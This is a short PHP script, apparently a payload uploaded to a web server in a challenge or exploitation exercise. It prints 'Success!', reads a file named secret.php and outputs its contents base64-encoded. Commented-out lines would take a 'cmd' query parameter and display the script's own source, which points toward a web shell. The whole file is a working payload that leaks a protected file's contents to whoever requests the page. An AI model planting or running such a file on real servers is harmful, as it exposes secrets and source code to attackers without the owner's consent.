<?php
  echo("Success!\n");
  //$command = $_GET['cmd'];
  //echo $command."\n";
  $infile = file_get_contents("secret.php");
  echo base64_encode($infile);
  //show_source(__FILE__);
?>
